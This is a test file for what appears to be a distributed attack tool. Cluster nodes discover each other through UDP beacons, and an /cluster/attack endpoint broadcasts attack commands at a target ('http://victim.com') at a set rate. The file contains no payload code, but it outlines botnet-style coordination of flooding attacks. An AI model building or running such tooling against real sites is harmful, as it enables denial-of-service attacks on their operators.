import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { startClusterNode, clusterAttackHandler, getClusterMembers } from '../src/cluster.js';
import request from 'supertest';
import { createApp } from '../src/app.js';
import dgram from 'dgram';

const app = createApp();

describe('Distributed Cluster', () => {
    let cluster: any;
    let port: number;

    beforeEach(() => {
        port = 40000 + Math.floor(Math.random() * 20000);
        cluster = startClusterNode({ port, host: '127.0.0.1' });
    });

    afterEach(() => {
        cluster.stop();
    });

    it('should discover nodes from beacons', async () => {
        await new Promise<void>((resolve) => {
            try {
                cluster.socket.address();
                resolve();
            } catch {
                cluster.socket.once('listening', resolve);
            }
        });

        const socket = dgram.createSocket('udp4');
        const beacon = JSON.stringify({ type: 'BEACON', ip: '192.168.1.100' });
        
        await new Promise<void>((resolve) => {
            socket.send(beacon, port, '127.0.0.1', () => {
                socket.close();
                resolve();
            });
        });

        // Give it a moment to process the UDP packet
        await new Promise(r => setTimeout(r, 100));
        
        const members = getClusterMembers();
        expect(members.map((m: any) => m.ip)).toContain('192.168.1.100');
    });

    it('should broadcast attack commands', async () => {
        const response = await request(app)
            .post('/cluster/attack')
            .send({ target: 'http://victim.com', rate: 10 });
        
        expect(response.status).toBe(200);
        expect(response.body.message).toContain('broadcasted');
    });
});
